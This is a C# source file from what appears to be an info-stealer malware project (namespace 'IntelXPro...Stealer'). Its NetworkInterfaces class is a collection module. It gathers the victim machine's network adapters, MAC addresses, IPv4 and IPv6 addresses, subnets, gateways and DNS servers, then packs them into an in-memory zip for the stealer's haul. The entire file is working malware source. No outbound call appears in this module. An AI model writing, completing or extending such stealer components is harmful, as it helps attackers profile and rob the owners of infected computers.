using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class NetworkInterfaces : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var networkApp = new Counter.CounterApplications { Name = "Network Interfaces" };
                StringBuilder sb = new StringBuilder();
                
                sb.AppendLine("[Network Interfaces]");
                sb.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();
                
                NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
                
                foreach (NetworkInterface ni in interfaces)
                {
                    sb.AppendLine($"Interface: {ni.Name}");
                    sb.AppendLine($"  Description: {ni.Description}");
                    sb.AppendLine($"  Type: {ni.NetworkInterfaceType}");
                    sb.AppendLine($"  Status: {ni.OperationalStatus}");
                    sb.AppendLine($"  Speed: {ni.Speed} bps");
                    sb.AppendLine($"  MAC Address: {ni.GetPhysicalAddress()}");
                    
                    IPInterfaceProperties ipProps = ni.GetIPProperties();
                    
                    foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            sb.AppendLine($"  IPv4: {ip.Address}");
                            sb.AppendLine($"  Subnet: {ip.IPv4Mask}");
                        }
                        else if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            sb.AppendLine($"  IPv6: {ip.Address}");
                        }
                    }
                    
                    foreach (GatewayIPAddressInformation gateway in ipProps.GatewayAddresses)
                    {
                        sb.AppendLine($"  Gateway: {gateway.Address}");
                    }
                    
                    foreach (IPAddress dns in ipProps.DnsAddresses)
                    {
                        sb.AppendLine($"  DNS: {dns}");
                    }
                    
                    sb.AppendLine();
                }
                
                string targetPath = "Network\\network_interfaces.txt";
                zip.AddTextFile(targetPath, sb.ToString());
                networkApp.Files.Add(targetPath);
                
                if (networkApp.Files.Count > 0)
                {
                    counter.Applications.Add(networkApp);
                }
            }
            catch (Exception ex)
            {
                var networkApp = new Counter.CounterApplications { Name = "Network Interfaces" };
                StringBuilder errorSb = new StringBuilder();
                errorSb.AppendLine("[Network Interfaces]");
                errorSb.AppendLine($"Error collecting network interfaces: {ex.Message}");
                
                string targetPath = "Network\\network_interfaces.txt";
                zip.AddTextFile(targetPath, errorSb.ToString());
                networkApp.Files.Add(targetPath);
                counter.Applications.Add(networkApp);
            }
        }
    }
}
